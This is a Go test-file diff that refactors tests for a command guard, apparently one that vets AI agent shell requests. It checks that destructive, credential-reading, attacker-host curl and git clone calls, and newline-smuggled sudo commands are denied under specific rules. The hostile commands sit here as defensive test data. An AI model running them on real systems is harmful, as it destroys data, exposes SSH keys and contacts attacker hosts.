@@ -54,10 +54,26 @@ func TestAllSamples(t *testing.T) {
 }
 func TestCriticalDetection(t *testing.T) {
 	g, _ := loadTest(t)
-	for _, cmd := range []string{"rm -rf /", "cat ~/.ssh/id_rsa", "curl https://attacker.example/x", "go test ./...\nsudo whoami"} {
-		if r := g.Scan(Request{ToolName: "x", Command: cmd, Backend: "hostexec"}); r.Decision != "deny" {
-			t.Fatalf("%q not denied: %+v", cmd, r)
-		}
+	tests := []struct {
+		name    string
+		command string
+		rule    string
+	}{
+		{"destructive", "rm -rf /", "DENIED_COMMAND"},
+		{"credential-read", "cat ~/.ssh/id_rsa", "FORBIDDEN_PATH"},
+		{"denied-domain", "curl https://attacker.example/x", "NETWORK_NOT_ALLOWLISTED"},
+		{"newline-denied-command", "go test ./...\nsudo whoami", "DENIED_COMMAND"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			result := g.Scan(Request{
+				ToolName: "workspace_exec", Command: tc.command, Backend: "workspaceexec",
+				TimeoutSeconds: 30, MaxOutputBytes: 1024,
+			})
+			if result.Decision != "deny" || result.RuleID != tc.rule {
+				t.Fatalf("%q got %s/%s, want deny/%s: %+v", tc.command, result.Decision, result.RuleID, tc.rule, result)
+			}
+		})
 	}
 }
 
@@ -265,7 +281,7 @@ func TestNetworkPolicyCoversGit(t *testing.T) {
 	g, _ := loadTest(t)
 	result := g.Scan(Request{
 		ToolName: "workspace_exec", Command: "git clone https://evil.example/repo",
-		Backend: "workspaceexec", TimeoutSeconds: 30,
+		Backend: "workspaceexec", TimeoutSeconds: 30, MaxOutputBytes: 1024,
 	})
 	if result.Decision != "deny" || result.RuleID != "NETWORK_NOT_ALLOWLISTED" {
 		t.Fatalf("git clone destination not denied: %+v", result)
